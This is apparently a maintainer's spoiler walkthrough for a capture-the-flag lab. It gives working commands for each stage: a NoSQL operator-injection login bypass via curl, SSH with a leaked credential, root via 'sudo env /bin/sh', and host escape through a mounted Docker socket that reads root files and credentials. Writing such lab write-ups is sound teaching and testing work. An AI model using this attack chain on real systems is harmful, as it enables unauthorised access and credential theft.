# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 portal, 22 outer-host SSH, 23 app-container
SSH. MongoDB is internal only and is not exposed.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. A login form posts to `/login`.
- View source: the front-end submits the credentials as a JSON body to `/login`,
  and a comment notes the login filter is built straight from the parsed body
  with operator keys never stripped. That is the hint for a NoSQL operator
  injection.

## Stage 1 - NoSQL injection auth bypass (admin console, FLAG)

- `/login` runs `users.findOne({ username, password })` with the raw JSON values.
  Passing an operator object as the password makes the filter always match.
- Bypass as admin:

  ```bash
  curl -s -c cookies.txt -X POST http://TARGET:8080/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":{"$ne":"x"}}'
  ```

- The response redirects to `/dashboard`. Fetch it with the cookie jar:

  ```bash
  curl -s -b cookies.txt http://TARGET:8080/dashboard
  ```

- The admin console shows the first flag (`FLAG{...}`) and an "Ops handover"
  note. The `auditor` account exists too but has role `viewer`, so target
  `admin` specifically; only the admin role reaches the console.

## Stage 2 - Reused credential to the app container (leo, FLAG)

- The ops note discloses a shared maintenance account: SSH user `leo` with its
  password. Log in over the app container SSH (published on port 23):

  ```bash
  ssh leo@TARGET -p 23
  cat ~/leo.txt
  ```

- That gives the second `FLAG{...}`.

## Stage 3 - leo to app-container root (sudo env, NOSQL_FLAG)

- `sudo -l` shows `leo` may run `/usr/bin/env` as root with NOPASSWD.
- `sudo env /bin/sh` (GTFOBins) gives a root shell in the app container.
- `cat /root/app-root.txt` gives the `NOSQL_FLAG{...}`.

## Stage 4 - App-container root to outer-host root (exposed Docker socket)

- As root in the app container, note `/var/run/docker.sock` is mounted and a
  static `docker` client is on `PATH`.
- Launch a container that mounts the outer host filesystem and read the flag and
  the outer host credential note. Use `node:22-bookworm`, which the outer engine
  already pulled while building the inner stack, so this step needs no network at
  solve time:

  ```bash
  docker run --rm -v /:/host node:22-bookworm cat /host/root/root.txt
  docker run --rm -v /:/host node:22-bookworm cat /host/root/dev_credentials.txt
  ```

  (`mongo:7.0` is also present from the inner build and works the same way. An
  image the outer engine does not have, for example `alpine`, would require a
  fresh pull and fails on a network-isolated host.)

- The first prints the outer-host root flag (`MAIN_FLAG{...}`). The second
  discloses `dev`'s password on the outer host.

- Honesty note: the mounted socket is already a full outer-root primitive. This
  `-v /:/host` mount reads every outer-host flag, including the `dev` user flag
  at `/host/home/dev/user.txt`, directly as root. Stage 5 below is a realism
  flourish, not a gate; a player who ignores `dev` still collects all five flags.

## Stage 5 - Outer-host user (dev, MAIN_FLAG)

- Use the recovered credential to log in over the outer host SSH (port 22) and
  read the user flag:

  ```bash
  ssh dev@TARGET -p 22
  cat ~/user.txt
  ```

- That gives the outer-host user flag (`MAIN_FLAG{...}`).

## Notes and red herrings

- `auditor` in the `users` collection authenticates through the same injection
  but has the `viewer` role and cannot see the admin console; it exists to make
  the player target `admin`.
- MongoDB is deliberately not published. There is no direct database dump route;
  the NoSQL injection is the only intended path to the seeded data.
- As `dev` on the outer host you can also read the inner stack build files under
  `/home/dev/docker-app` (root owned, world readable). This is recon flavor and
  reveals nothing that advances the forward path, which reaches `dev` last.
